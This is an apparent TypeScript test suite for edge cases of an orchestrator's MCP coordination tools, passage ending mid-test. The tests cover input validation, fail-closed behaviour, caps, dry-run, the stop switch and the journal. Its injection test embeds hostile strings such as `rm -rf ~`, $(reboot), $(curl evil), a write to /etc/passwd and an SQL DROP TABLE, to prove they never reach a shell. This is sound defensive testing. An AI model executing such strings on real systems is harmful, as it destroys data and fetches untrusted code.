import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { existsSync } from "node:fs";
import { chmod, mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";
import { Client, InMemoryTransport } from "@modelcontextprotocol/client";
import { McpServer } from "@modelcontextprotocol/server";

import { registerCoordinationTools } from "../src/coordination/register.js";
import type { CommandResult, Runner } from "../src/coordination/shell.js";
import { CoordinationStore } from "../src/coordination/store.js";

/**
 * Edge cases of the coordination tools, derived from the project's assumptions
 * (docs/control-center-refactor.md): the model is unreliable, so every limit must hold inside a
 * tool; git and GitHub are the truth, so tools must survive them failing; everything is journaled.
 */

const REPO = "PiotrGry/zdrovena-reconciliation";
const ok = (stdout = ""): CommandResult => ({ ok: true, code: 0, stdout, stderr: "", command: "" });
const fail = (stderr: string): CommandResult => ({ ok: false, code: 1, stdout: "", stderr, command: "" });
type Respond = (file: string, args: readonly string[]) => CommandResult | undefined;

interface Harness { readonly client: Client; readonly store: CoordinationStore; readonly calls: string[][]; readonly root: string; ran(prefix: string): boolean; close(): Promise<void> }

async function harness(respond: Respond = () => undefined, env: Record<string, string> = {}, config: Record<string, unknown> = {}): Promise<Harness> {
  const root = await mkdtemp(join(tmpdir(), "pirx-edge-"));
  await mkdir(join(root, "repo"), { recursive: true });
  await writeFile(join(root, "orchestrator.json"), JSON.stringify({ githubProjectOwner: "PiotrGry", githubProjectNumber: 3, repositories: [{ repository: REPO, repositoryRoot: join(root, "repo"), baseBranch: "develop", remoteName: "origin", testCommands: ["uv run pytest"], delivery: { postMerge: { mustReach: ["main"] } } }], ...config }));
  const calls: string[][] = [];
  const run: Runner = async (file, args) => { calls.push([file, ...args]); return respond(file, args) ?? ok(""); };
  const store = new CoordinationStore(join(root, "pirx.sqlite"));
  const environment = { HOME: root, PIRX_WORKER_SYSTEMD: "0", PIRX_CLAUDE_EXECUTABLE: "/bin/false", PIRX_COORDINATION_CONFIG: join(root, "none.json"), PIRX_ORCHESTRATOR_CONFIG: join(root, "orchestrator.json"), PIRX_STOP_FILE: join(root, "STOP"), PIRX_WORKER_LOG_DIR: join(root, "logs"), PIRX_WORKTREE_PARENT: join(root, "wt"), ...env };
  const server = new McpServer({ name: "edge", version: "1" });
  registerCoordinationTools(server, environment, { run, store });
  const [a, b] = InMemoryTransport.createLinkedPair();
  const client = new Client({ name: "edge", version: "1" });
  await Promise.all([server.connect(a), client.connect(b)]);
  return { client, store, calls, root, ran: (prefix) => calls.some((call) => call.join(" ").startsWith(prefix)), close: async () => { await client.close(); await server.close(); store.close(); await rm(root, { recursive: true, force: true }); } };
}

async function call(h: Harness, name: string, args: Record<string, unknown>): Promise<Record<string, unknown>> {
  const result = await h.client.callTool({ name, arguments: args });
  return (result.structuredContent ?? { isError: result.isError, text: JSON.stringify(result.content) }) as Record<string, unknown>;
}

/** A Task with a real directory as its worktree, and git answers describing its state. */
function workspace(h: Harness, issue: number, branch = `pirx/issue-${issue}`): void {
  h.store.upsertTask({ repository: REPO, issue, branch, worktree: h.root, state: "active" });
}
const gitState = (state: { dirty?: boolean; ahead?: number }): Respond => (file, args) => {
  if (file !== "git") return undefined;
  if (args[0] === "rev-parse" && args[1] === "HEAD") return ok("abc1234\n");
  if (args[0] === "status") return ok(state.dirty === true ? "?? stray.txt\n" : "");
  if (args[0] === "log") return ok(Array.from({ length: state.ahead ?? 1 }, (_, index) => `c${index} work`).join("\n"));
  if (args[0] === "rev-list") return ok("0\n");
  if (args[0] === "rev-parse" && args[1] === "--verify") return fail("");
  return undefined;
};
const first = (...responders: Respond[]): Respond => (file, args) => { for (const respond of responders) { const value = respond(file, args); if (value !== undefined) return value; } return undefined; };
const queued = (issue: number, fields: Record<string, unknown> = {}): Respond => (file, args) => file === "gh" && args[0] === "project" && args[1] === "item-list" ? ok(JSON.stringify({ items: [{ content: { repository: REPO, number: issue, type: "Issue", url: `https://github.com/${REPO}/issues/${issue}` }, worker: "Pirx", status: "Todo", ...fields }] })) : undefined;

// ── The model sends wrong input ────────────────────────────────────────────

test("input: a malformed repository or a non-positive Issue never reaches a command", async () => {
  const h = await harness();
  try {
    for (const args of [{ repository: "not a repo", issue: 1 }, { repository: "../../etc/passwd", issue: 1 }, { repository: REPO, issue: 0 }, { repository: REPO, issue: -3 }, { repository: REPO, issue: 1.5 }, { repository: REPO }]) {
      const result = await h.client.callTool({ name: "task_facts", arguments: args });
      assert.equal(result.isError, true, JSON.stringify(args));
    }
    assert.equal(h.calls.length, 0);
  } finally { await h.close(); }
});

test("input: shell metacharacters in a title or body travel as one argument, never through a shell", async () => {
  const h = await harness((file, args) => file === "gh" && args[1] === "list" ? ok("[]") : file === "gh" && args[1] === "create" ? ok("https://github.com/x/y/issues/1") : undefined);
  try {
    const title = "Fix `rm -rf ~`; $(reboot) && echo \"x\" | tee /etc/passwd";
    const body = "line one\n$(curl evil) `id`\n'; DROP TABLE x; --";
    await call(h, "issue_create", { repository: REPO, title, body, kind: "improvement" });
    const created = h.calls.find((entry) => entry[0] === "gh" && entry[2] === "create")!;
    assert.equal(created[created.indexOf("--title") + 1], title);
    assert.equal(created[created.indexOf("--body") + 1], body);
  } finally { await h.close(); }
});

test("input: the allowlist ignores letter case, and still refuses a different repository", async () => {
  const h = await harness((file, args) => file === "gh" && args[0] === "pr" ? ok("[]") : undefined);
  try {
    assert.equal((await call(h, "pr_list", { repository: "piotrgry/ZDROVENA-reconciliation" })).refused, undefined);
    assert.equal((await call(h, "pr_list", { repository: "PiotrGry/zdrovena-reconciliation-fork" })).refused, true);
  } finally { await h.close(); }
});

test("input: an instruction too large for a process argument is refused before any worktree is made", async () => {
  const h = await harness(first(queued(7), (file, args) => file === "git" && args[1] === "list" ? ok("") : undefined));
  try {
    const result = await call(h, "worker_start", { repository: REPO, issue: 7, instruction: "x".repeat(200_000) });
    assert.equal(result.refused, true);
    assert.match(String(result.reason), /too long/iu);
    assert.equal(h.ran("git worktree add"), false);
    assert.equal(h.store.lock(), undefined);
  } finally { await h.close(); }
});

// ── git and GitHub fail or disagree ────────────────────────────────────────

test("worker_start fails closed: an unreadable Project is a refusal, not a start", async () => {
  const h = await harness((file, args) => file === "gh" && args[0] === "project" ? fail("HTTP 502") : file === "git" && args[1] === "list" ? ok("") : undefined);
  try {
    const result = await call(h, "worker_start", { repository: REPO, issue: 7, instruction: "do it" });
    assert.equal(result.refused, true);
    assert.equal(h.ran("git worktree add"), false);
  } finally { await h.close(); }
});

test("worker_start: when git cannot create the worktree, no lock and no Task record are left behind", async () => {
  const h = await harness(first(queued(7), (file, args) => file === "git" && args[0] === "worktree" && args[1] === "add" ? fail("fatal: a branch named 'pirx/issue-7' already exists") : file === "git" && args[1] === "list" ? ok("") : undefined));
  try {
    const result = await call(h, "worker_start", { repository: REPO, issue: 7, instruction: "do it" });
    assert.match(String(result.stderr), /already exists/u);
    assert.equal(h.store.lock(), undefined);
    assert.equal(h.store.getTask(`${REPO}#7`), undefined);
  } finally { await h.close(); }
});

test("worker_resume: a Task without a worktree is refused and pointed to worker_start", async () => {
  const h = await harness(first(queued(7), (file, args) => file === "git" && args[1] === "list" ? ok("") : undefined));
  try {
    const result = await call(h, "worker_resume", { repository: REPO, issue: 7, instruction: "go on" });
    assert.equal(result.refused, true);
    assert.match(String(result.reason), /worker_start/u);
  } finally { await h.close(); }
});

test("task_ship: uncommitted files and an empty branch are refused; nothing is pushed", async () => {
  const dirty = await harness(gitState({ dirty: true }));
  try { workspace(dirty, 7); assert.match(String((await call(dirty, "task_ship", { repository: REPO, issue: 7, title: "t", body: "b" })).reason), /uncommitted/u); assert.equal(dirty.ran("git push"), false); } finally { await dirty.close(); }
  const empty = await harness(gitState({ ahead: 0 }));
  try { workspace(empty, 7); assert.match(String((await call(empty, "task_ship", { repository: REPO, issue: 7, title: "t", body: "b" })).reason), /nothing to ship/u); assert.equal(empty.ran("git push"), false); } finally { await empty.close(); }
});

test("task_ship: a rejected push is reported, never forced, and no pull request is opened", async () => {
  const h = await harness(first((file, args) => file === "git" && args[0] === "push" ? fail("! [rejected] HEAD -> pirx/issue-7 (non-fast-forward)") : undefined, gitState({})));
  try {
    workspace(h, 7);
    const result = await call(h, "task_ship", { repository: REPO, issue: 7, title: "t", body: "b" });
    assert.match(String(result.stderr), /rejected/u);
    assert.equal(h.calls.some((entry) => entry.some((part) => /^(--force|-f|--force-with-lease)/u.test(part) || part.startsWith("+"))), false);
    assert.equal(h.ran("gh pr create"), false);
  } finally { await h.close(); }
});

test("task_ship: an open pull request of the branch is reused, not duplicated", async () => {
  const h = await harness(first((file, args) => file === "gh" && args[0] === "pr" && args[1] === "list" ? ok(JSON.stringify([{ number: 42, url: "https://github.com/x/y/pull/42" }])) : undefined, gitState({})));
  try {
    workspace(h, 7);
    const result = await call(h, "task_ship", { repository: REPO, issue: 7, title: "t", body: "b" });
    assert.equal((result.pr as { number: number }).number, 42);
    assert.equal(h.ran("gh pr create"), false);
  } finally { await h.close(); }
});

test("task_close: an open PR, or a merged PR without a merge commit, closes nothing", async () => {
  for (const pr of [{ number: 9, state: "OPEN", mergeCommit: null, body: "Fixes #5" }, { number: 9, state: "MERGED", mergeCommit: null, body: "Fixes #5" }]) {
    const h = await harness((file, args) => file === "gh" && args[1] === "view" ? ok(JSON.stringify(pr)) : file === "git" && args[1] === "list" ? ok("") : undefined);
    try {
      assert.equal((await call(h, "task_close", { repository: REPO, issue: 5, evidence: "done", pr: 9 })).refused, true);
      assert.equal(h.ran("gh issue close"), false);
    } finally { await h.close(); }
  }
});

test("task_close: an Issue that is already closed is a success, so a repeated tick does no harm", async () => {
  const h = await harness((file, args) => file === "gh" && args[1] === "view" ? ok(JSON.stringify({ number: 9, state: "MERGED", mergeCommit: { oid: "abc" }, body: "Fixes #5" })) : file === "gh" && args[1] === "close" ? fail("Issue #5 is already closed") : file === "git" && args[1] === "list" ? ok("") : undefined);
  try { assert.equal((await call(h, "task_close", { repository: REPO, issue: 5, evidence: "done", pr: 9 })).closed, true); } finally { await h.close(); }
});

test("issue_create fails closed: when the open Issues cannot be listed, nothing is created", async () => {
  const h = await harness((file, args) => file === "gh" && args[1] === "list" ? fail("HTTP 500") : undefined);
  try {
    for (const kind of ["bug", "improvement"]) assert.equal((await call(h, "issue_create", { repository: REPO, title: "t", body: "b", kind })).refused, true);
    assert.equal(h.ran("gh issue create"), false);
  } finally { await h.close(); }
});

test("issue_create: a sixth open bug Issue is refused", async () => {
  const bugs = Array.from({ length: 5 }, (_, index) => ({ number: 800 + index, title: `bug ${String.fromCharCode(97 + index)}`, body: "" }));
  const h = await harness((file, args) => file === "gh" && args[1] === "list" ? ok(JSON.stringify(bugs)) : undefined);
  try { assert.match(String((await call(h, "issue_create", { repository: REPO, title: "another failure", body: "b", kind: "bug" })).reason), /cap is 5/u); } finally { await h.close(); }
});

test("ci_rerun: a rerun that GitHub rejected does not use up the cap", async () => {
  let reject = true;
  const h = await harness((file, args) => file === "gh" && args[0] === "run" ? (reject ? fail("run 77 cannot be rerun; its workflow file may be broken") : ok("")) : undefined, { PIRX_CAP_CI_RERUNS: "1" });
  try {
    assert.match(String((await call(h, "ci_rerun", { repository: REPO, runId: 77 })).stderr), /cannot be rerun/u);
    reject = false;
    assert.equal((await call(h, "ci_rerun", { repository: REPO, runId: 77 })).rerun, true);
    assert.equal((await call(h, "ci_rerun", { repository: REPO, runId: 77 })).refused, true);
  } finally { await h.close(); }
});

test("ask_opus: only answers count against the cap; a broken answer is a failure, not advice", async () => {
  let output = "not json";
  const h = await harness((file) => file === "/bin/false" ? ok(output) : undefined, { PIRX_CAP_ASK_OPUS: "2" });
  const ask = () => call(h, "ask_opus", { repository: REPO, issue: 5, facts: "f", question: "q", pirxView: "v" });
  try {
    assert.equal((await ask()).advice, undefined);
    output = JSON.stringify({ result: "Rerun the job." });
    assert.equal((await ask()).advice, "Rerun the job.");
    assert.equal((await ask()).advice, "Rerun the job.");
    assert.equal((await ask()).refused, true);
  } finally { await h.close(); }
});

test("ask_opus: facts too large for a process argument are refused with a reason", async () => {
  const h = await harness((file) => file === "/bin/false" ? ok(JSON.stringify({ result: "ok" })) : undefined);
  try {
    const result = await call(h, "ask_opus", { repository: REPO, issue: 5, facts: "f".repeat(200_000), question: "q", pirxView: "v" });
    assert.equal(result.refused, true);
    assert.equal(h.ran("/bin/false"), false);
  } finally { await h.close(); }
});

test("task_facts: GitHub failing is reported as a fact; a recorded worktree that is gone is shown as missing", async () => {
  const h = await harness((file) => file === "gh" ? fail("HTTP 503: Service Unavailable") : undefined);
  try {
    h.store.upsertTask({ repository: REPO, issue: 7, branch: "pirx/issue-7", worktree: join(h.root, "deleted"), state: "active" });
    const facts = await call(h, "task_facts", { repository: REPO, issue: 7 });
    assert.match(JSON.stringify(facts.issue), /503/u);
    assert.equal((facts.workspace as { exists: boolean }).exists, false);
  } finally { await h.close(); }
});

test("queue_list: other repositories, drafts, Done and other workers are left out; items without an order come last", async () => {
  const item = (number: number, extra: Record<string, unknown>) => ({ content: { repository: REPO, number, type: "Issue", title: `t${number}` }, worker: "Pirx", status: "Todo", ...extra });
  const items = [item(1, {}), item(2, { "queue Order": 20 }), item(3, { "queue Order": 10 }), item(4, { status: "Done", "queue Order": 1 }), item(5, { worker: "Human", "queue Order": 2 }),
    { content: { repository: "PiotrGry/ai-assistant", number: 6, type: "Issue" }, worker: "Pirx", status: "Todo", "queue Order": 3 }, { content: { type: "DraftIssue", title: "draft" }, worker: "Pirx", status: "Todo", "queue Order": 4 }];
  const h = await harness((file, args) => file === "gh" && args[0] === "project" ? ok(JSON.stringify({ items })) : undefined);
  try { assert.deepEqual(((await call(h, "queue_list", {})).items as { issue: number }[]).map((entry) => entry.issue), [3, 2, 1]); } finally { await h.close(); }
});

test("queue tools without a configured Project say so instead of failing obscurely", async () => {
  const h = await harness(undefined, {}, { githubProjectOwner: undefined, githubProjectNumber: undefined });
  try {
    assert.match(String((await call(h, "queue_list", {})).error), /No GitHub Project/u);
    assert.match(String((await call(h, "queue_set", { repository: REPO, issue: 1, status: "Todo" })).error), /No GitHub Project/u);
  } finally { await h.close(); }
});

// ── Modes that must not change anything ────────────────────────────────────

test("dry-run changes nothing locally either: no Task record, no parked state, no lock", async () => {
  const h = await harness(first(queued(7), (file, args) => file === "git" && args[1] === "list" ? ok("") : undefined), { PIRX_COORDINATION_DRY_RUN: "1" });
  try {
    await call(h, "task_park", { repository: REPO, issue: 7, reason: "wait" });
    assert.equal(h.store.getTask(`${REPO}#7`), undefined, "task_park wrote a record in dry-run");
    const started = await call(h, "worker_start", { repository: REPO, issue: 7, instruction: "do it" });
    assert.equal(started.dryRun, true);
    assert.equal(h.store.lock(), undefined);
    assert.equal(h.store.getTask(`${REPO}#7`), undefined, "worker_start wrote a record in dry-run");
    assert.equal(h.ran("git worktree add"), false);
  } finally { await h.close(); }
});

test("the stop switch wins over dry-run, and is read on every call", async () => {
  const h = await harness(undefined, { PIRX_COORDINATION_DRY_RUN: "1" });
  try {
    assert.equal((await call(h, "task_park", { repository: REPO, issue: 7, reason: "x" })).dryRun, true);
    await writeFile(join(h.root, "STOP"), "");
    assert.match(String((await call(h, "task_park", { repository: REPO, issue: 7, reason: "x" })).reason), /stop switch/u);
    await rm(join(h.root, "STOP"));
    assert.equal((await call(h, "task_park", { repository: REPO, issue: 7, reason: "x" })).dryRun, true);
  } finally { await h.close(); }
});

// ── Journal ────────────────────────────────────────────────────────────────

test("journal: two processes writing the same file both keep every entry", async () => {
  const root = await mkdtemp(join(tmpdir(), "pirx-edge-journal-"));
  try {
    const a = new CoordinationStore(join(root, "pirx.sqlite")); const b = new CoordinationStore(join(root, "pirx.sqlite"));
    for (let index = 0; index < 25; index += 1) { a.append({ kind: "note", name: `a${index}`, ok: true }); b.append({ kind: "note", name: `b${index}`, ok: true }); }
    const all = a.journal({ limit: 500 });
    assert.equal(all.length, 50);
    assert.equal(new Set(all.map((entry) => entry.seq)).size, 50);
    a.close(); b.close();
  } finally { await rm(root, { recursive: true, force: true }); }
});

test("journal: asking for an entry that does not exist is an answer, not an error", async () => {
  const h = await harness();
  try {
    assert.equal((await call(h, "journal_read", { seq: 999 })).found, false);
    assert.equal((await call(h, "journal_verdict", { seq: 999, verdict: "wrong" })).found, false);
  } finally { await h.close(); }
});

test("journal: a huge tool result is stored shortened, so the journal cannot blow up either", async () => {
  const h = await harness((file, args) => file === "gh" && args[0] === "issue" ? ok(JSON.stringify(Array.from({ length: 100 }, (_, index) => ({ number: index, title: "t".repeat(2_000), state: "OPEN", labels: [] })))) : undefined);
  try {
    await call(h, "issue_list", { repository: REPO });
    const stored = JSON.stringify(h.store.journal({ kind: "tool" })[0]!.output);
    assert.ok(stored.length <= 8_100, String(stored.length));
  } finally { await h.close(); }
});

// ── Watcher ────────────────────────────────────────────────────────────────

test("watcher: GitHub being down produces no false events, no crash, and keeps the cursors", async () => {
  const { collectEvents } = await import("../src/coordination/watch-cli.js");
  const { loadCoordinationSettings } = await import("../src/coordination/settings.js");
  const h = await harness();
  const settings = loadCoordinationSettings({ HOME: h.root, PIRX_ORCHESTRATOR_CONFIG: join(h.root, "orchestrator.json") });
  let up = true;
  const run: Runner = async (file, args) => !up ? fail("HTTP 503") : ok(file === "gh" && args[0] === "pr" ? "[]" : JSON.stringify({ items: [] }));
  try {
    h.store.append({ kind: "tick", name: "tick", ok: true });
    (await collectEvents(h.store, settings, run, 60)).commit();
    const before = h.store.watchValue("queue");
    up = false;
    const down = await collectEvents(h.store, settings, run, 60);
    assert.deepEqual(down.events, []);
    down.commit();
    assert.equal(h.store.watchValue("queue"), before);
  } finally { await h.close(); }
});

test("watcher: a worker's exit is reported once per run, and a live worker suppresses the idle nudge", async () => {
  const { collectEvents } = await import("../src/coordination/watch-cli.js");
  const { loadCoordinationSettings } = await import("../src/coordination/settings.js");
  const { processStart } = await import("../src/coordination/proc.js");
  const h = await harness();
  const settings = loadCoordinationSettings({ HOME: h.root, PIRX_ORCHESTRATOR_CONFIG: join(h.root, "orchestrator.json") });
  const run: Runner = async (file, args) => ok(file === "gh" && args[0] === "pr" ? "[]" : JSON.stringify({ items: [{ content: { repository: REPO, number: 1 }, worker: "Pirx", status: "Todo" }] }));
  const exited = (events: string[]) => events.filter((event) => event.includes("Worker zakończył")).length;
  try {
    h.store.append({ kind: "tick", name: "tick", ok: true });
    h.store.acquire({ task: `${REPO}#1`, pid: process.pid, pidStart: processStart(process.pid)!, startedAt: h.store.now(), logPath: "/dev/null", reportPath: join(h.root, "run1.json") });
    const live = await collectEvents(h.store, settings, run, 60);
    assert.equal(exited(live.events), 0);
    assert.equal(live.events.some((event) => event.includes("worker nie pracuje")), false);
    h.store.release();
    h.store.acquire({ task: `${REPO}#1`, pid: 2_147_483_000, startedAt: h.store.now(), logPath: "/dev/null", reportPath: join(h.root, "run1.json") });
    const once = await collectEvents(h.store, settings, run, 60); once.commit();
    assert.equal(exited(once.events), 1);
    assert.equal(exited((await collectEvents(h.store, settings, run, 60)).events), 0);
    h.store.release();
    h.store.acquire({ task: `${REPO}#1`, pid: 2_147_483_000, startedAt: h.store.now(), logPath: "/dev/null", reportPath: join(h.root, "run2.json") });
    assert.equal(exited((await collectEvents(h.store, settings, run, 60)).events), 1);
  } finally { await h.close(); }
});

test("tick guard: a guard file with garbage in it is taken over", async () => {
  const { takeGuard, releaseGuard } = await import("../src/coordination/proc.js");
  const root = await mkdtemp(join(tmpdir(), "pirx-edge-guard-"));
  try {
    for (const content of ["garbage", "-5", "0", "12 34 56", "\n"]) {
      await writeFile(join(root, "g"), content);
      assert.equal(takeGuard(join(root, "g")), true, JSON.stringify(content));
      releaseGuard(join(root, "g"));
    }
  } finally { await rm(root, { recursive: true, force: true }); }
});

// ── Time, size and text ────────────────────────────────────────────────────

test("daily caps: the operator's midnight is right on both daylight-saving change days", async () => {
  const { startOfDay } = await import("../src/coordination/settings.js");
  assert.equal(startOfDay("2026-03-29T12:00:00.000Z", "Europe/Warsaw"), "2026-03-28T23:00:00.000Z");
  assert.equal(startOfDay("2026-03-29T00:30:00.000Z", "Europe/Warsaw"), "2026-03-28T23:00:00.000Z");
  assert.equal(startOfDay("2026-10-25T12:00:00.000Z", "Europe/Warsaw"), "2026-10-24T22:00:00.000Z");
  assert.equal(startOfDay("2026-10-25T23:30:00.000Z", "Europe/Warsaw"), "2026-10-25T23:00:00.000Z");
});

test("result budget: thousands of small keys, deep nesting and repeated fitting all stay valid and bounded", async () => {
  const { fitBudget, RESULT_BUDGET } = await import("../src/coordination/toolkit.js");
  const wide = Object.fromEntries(Array.from({ length: 5_000 }, (_, index) => [`key${index}`, index]));
  let deep: Record<string, unknown> = { leaf: "x".repeat(50_000) };
  for (let index = 0; index < 30; index += 1) deep = { level: index, child: deep, list: Array.from({ length: 50 }, () => "item") };
  for (const value of [wide, deep, { text: "ż".repeat(40_000) }]) {
    const once = fitBudget(value);
    assert.ok(JSON.stringify(once).length <= RESULT_BUDGET);
    assert.doesNotThrow(() => JSON.parse(JSON.stringify(once)));
    assert.deepEqual(fitBudget(once), once, "fitting twice changes nothing");
  }
});

test("tick answer: the last answer block is taken, and output without one is still an answer text", async () => {
  const { extractAnswer } = await import("../src/coordination/tick-cli.js");
  assert.equal(extractAnswer("x\nPirx: first\n\nMetryki: 1\n[tool] a\n\nPirx: Decyzja: nic\nPowód: brak\n\nMetryki: 5 tokenów\n"), "Decyzja: nic\nPowód: brak");
  assert.equal(extractAnswer("Error: Ollama is not reachable"), "Error: Ollama is not reachable");
  assert.equal(extractAnswer(""), "");
});

// ── Worker runner ──────────────────────────────────────────────────────────

const runner = join(dirname(fileURLToPath(import.meta.url)), "..", "src", "coordination", "worker-run.js");
async function runWorker(script: string, job: Record<string, unknown> = {}): Promise<{ report: Record<string, unknown>; root: string; marker: string }> {
  const root = await mkdtemp(join(tmpdir(), "pirx-edge-runner-"));
  const fake = join(root, "fake.sh"); const marker = join(root, "claude-ran");
  await writeFile(fake, `#!/bin/sh\ntouch ${marker}\n${script}\n`); await chmod(fake, 0o755);
  const jobPath = join(root, "job.json");
  await writeFile(jobPath, JSON.stringify({ task: `${REPO}#9`, cwd: root, setupCommands: [], executable: fake, args: [], prompt: "x", env: { PATH: process.env.PATH ?? "" }, logPath: join(root, "log.jsonl"), reportPath: join(root, "report.json"), timeoutMs: 60_000, storagePath: join(root, "x.sqlite"), sessionId: "s", ...job }));
  const child = spawn(process.execPath, [runner, jobPath], { stdio: "ignore" });
  await new Promise((resolve) => child.on("close", resolve));
  return { report: JSON.parse(await readFile(join(root, "report.json"), "utf8")) as Record<string, unknown>, root, marker };
}

test("worker runner: a failing setup command is reported and the worker is never started", async () => {
  const { report, root, marker } = await runWorker("echo never", { setupCommands: ["echo broken >&2; exit 3"] });
  try {
    assert.equal(report.outcome, "setup_failed");
    assert.equal(report.exitCode, 3);
    assert.equal(existsSync(marker), false);
  } finally { await rm(root, { recursive: true, force: true }); }
});

test("worker runner: a usage limit is told apart from a failure, with the provider's message", async () => {
  const { report, root } = await runWorker(`echo '{"type":"result","result":"You have hit your session limit · resets 21:00","is_error":true}'; exit 1`);
  try {
    assert.equal(report.outcome, "usage_limit");
    assert.match(String(report.usageLimitMessage), /resets 21:00/u);
  } finally { await rm(root, { recursive: true, force: true }); }
});

test("worker runner: a run over its time limit is stopped and reported as a timeout", async () => {
  const { report, root } = await runWorker(`echo '{"type":"assistant","message":{"content":[{"type":"text","text":"still working"}]}}'; sleep 30`, { timeoutMs: 800 });
  try {
    assert.equal(report.outcome, "timeout");
    assert.equal(report.workerReport, "still working");
  } finally { await rm(root, { recursive: true, force: true }); }
});

test("worker runner: output that is not JSON, and a worker that says nothing, still end in a report", async () => {
  const noisy = await runWorker("echo 'plain text'; echo '{broken'; exit 2");
  try { assert.equal(noisy.report.outcome, "failed"); assert.equal(noisy.report.exitCode, 2); } finally { await rm(noisy.root, { recursive: true, force: true }); }
  const silent = await runWorker("exit 0");
  try { assert.equal(silent.report.outcome, "finished"); assert.equal(silent.report.workerReport, ""); } finally { await rm(silent.root, { recursive: true, force: true }); }
});

// ── Second round: relations, text and time that look right but are not ──────

test("task_close: a reference to the same number in another repository does not count", async () => {
  const pr = (fields: Record<string, unknown>) => ok(JSON.stringify({ number: 9, state: "MERGED", mergeCommit: { oid: "abc" }, title: "t", body: "", headRefName: "fix/x", closingIssuesReferences: [], ...fields }));
  let current = pr({});
  const h = await harness((file, args) => file === "gh" && args[1] === "view" ? current : file === "git" && args[1] === "list" ? ok("") : undefined);
  const close = () => call(h, "task_close", { repository: REPO, issue: 5, evidence: "done", pr: 9 });
  try {
    current = pr({ body: "Fixes PiotrGry/ai-assistant#5" });
    assert.equal((await close()).refused, true, "other/repo#5 is not this #5");
    current = pr({ body: "Part of epic#5 work" });
    assert.equal((await close()).refused, true, "word#5 is not a reference");
    current = pr({ closingIssuesReferences: [{ number: 5, repository: { name: "ai-assistant", owner: { login: "PiotrGry" } } }] });
    assert.equal((await close()).refused, true, "closes ai-assistant#5, not zdrovena#5");
    current = pr({ closingIssuesReferences: [{ number: 5, repository: { name: "zdrovena-reconciliation", owner: { login: "PiotrGry" } } }] });
    assert.equal((await close()).closed, true);
    current = pr({ body: "(#5)" });
    assert.equal((await close()).closed, true);
    current = pr({ body: `Fixes ${REPO}#5` });
    assert.equal((await close()).closed, true, "the full name of this repository counts");
  } finally { await h.close(); }
});

test("bug fingerprint: Polish messages that differ only in Polish words are different bugs", async () => {
  const { bugFingerprint } = await import("../src/coordination/actions.js");
  assert.notEqual(bugFingerprint("exception|wysyłka|Brak źródła"), bugFingerprint("exception|wysyłka|Błąd żądania"));
  assert.notEqual(bugFingerprint("Żółć"), bugFingerprint("Źdźbło"));
  assert.equal(bugFingerprint("Błąd przy zamówieniu 1234"), bugFingerprint("błąd przy zamówieniu 98"));
  assert.notEqual(bugFingerprint(""), undefined);
});

test("daily caps: an unknown time zone falls back to UTC instead of breaking every capped tool", async () => {
  const { startOfDay } = await import("../src/coordination/settings.js");
  assert.equal(startOfDay("2026-11-20T10:00:00.000Z", "Mars/Olympus"), "2026-11-20T00:00:00.000Z");
  assert.equal(startOfDay("2026-11-20T10:00:00.000Z", ""), "2026-11-20T00:00:00.000Z");
  const h = await harness((file) => file === "/bin/false" ? ok(JSON.stringify({ result: "advice" })) : undefined, { PIRX_GOOGLE_CALENDAR_TIMEZONE: "Mars/Olympus" });
  try { assert.equal((await call(h, "ask_opus", { repository: REPO, issue: 5, facts: "f", question: "q", pirxView: "v" })).advice, "advice"); } finally { await h.close(); }
});

test("result budget: huge keys, emoji at the cut and a single giant string all stay within budget and valid", async () => {
  const { fitBudget, RESULT_BUDGET } = await import("../src/coordination/toolkit.js");
  const giantKeys = Object.fromEntries(Array.from({ length: 3 }, (_, index) => [`${index}${"k".repeat(20_000)}`, 1]));
  const emoji = { text: "😀".repeat(10_000) };
  for (const value of [giantKeys, emoji, { only: "x".repeat(1_000_000) }]) {
    const fitted = JSON.stringify(fitBudget(value));
    assert.ok(fitted.length <= RESULT_BUDGET, String(fitted.length));
    assert.equal(/\\ud[89ab][0-9a-f]{2}(?!\\ud[c-f])/iu.test(fitted) || /[\uD800-\uDBFF](?![\uDC00-\uDFFF])/u.test(fitted), false, "no emoji cut in half");
  }
});

test("watcher: queued work that is parked, or in a repository Pirx does not coordinate, does not wake it", async () => {
  const { collectEvents } = await import("../src/coordination/watch-cli.js");
  const { loadCoordinationSettings } = await import("../src/coordination/settings.js");
  const h = await harness();
  const settings = loadCoordinationSettings({ HOME: h.root, PIRX_ORCHESTRATOR_CONFIG: join(h.root, "orchestrator.json") });
  let items: Record<string, unknown>[] = [];
  const run: Runner = async (file, args) => ok(file === "gh" && args[0] === "pr" ? "[]" : JSON.stringify({ items }));
  const nudged = async () => (await collectEvents(h.store, settings, run, 60)).events.some((event) => event.includes("worker nie pracuje"));
  try {
    h.store.append({ kind: "tick", name: "tick", ok: true });
    h.store.upsertTask({ repository: REPO, issue: 3, branch: "pirx/issue-3", worktree: "", state: "parked", note: "waits for operator" });
    items = [{ content: { repository: REPO, number: 3 }, worker: "Pirx", status: "Todo" }, { content: { repository: "PiotrGry/elsewhere", number: 4 }, worker: "Pirx", status: "Todo" }];
    assert.equal(await nudged(), false, "only parked or foreign work is queued");
    items.push({ content: { repository: REPO, number: 8 }, worker: "Pirx", status: "Todo" });
    assert.equal(await nudged(), true);
    assert.equal(await nudged(), false, "at most once per IDLE_NUDGE_MINUTES");
  } finally { await h.close(); }
});

test("watcher: after three failed ticks the events are let go, and the counter starts again", async () => {
  const { settleEvents } = await import("../src/coordination/watch-cli.js");
  const h = await harness();
  let commits = 0;
  const collected = { events: ["e"], commit: () => { commits += 1; } };
  try {
    settleEvents(h.store, collected, false); settleEvents(h.store, collected, false);
    assert.equal(commits, 0);
    settleEvents(h.store, collected, false);
    assert.equal(commits, 1);
    assert.equal(h.store.watchValue("failed_ticks"), "0");
    settleEvents(h.store, collected, false);
    assert.equal(commits, 1, "a new run of failures starts from zero");
    settleEvents(h.store, collected, true);
    assert.equal(commits, 2);
    assert.equal(h.store.watchValue("failed_ticks"), "0");
  } finally { await h.close(); }
});

test("settings: a broken coordination.json is reported, not silently replaced by defaults", async () => {
  const { loadCoordinationSettings } = await import("../src/coordination/settings.js");
  const root = await mkdtemp(join(tmpdir(), "pirx-edge-settings-"));
  try {
    await writeFile(join(root, "coordination.json"), "{ \"workerModel\": \"claude-opus-5-5\", }");
    const settings = loadCoordinationSettings({ HOME: root, PIRX_COORDINATION_CONFIG: join(root, "coordination.json") });
    assert.match(String(settings.configurationError), /coordination\.json/u);
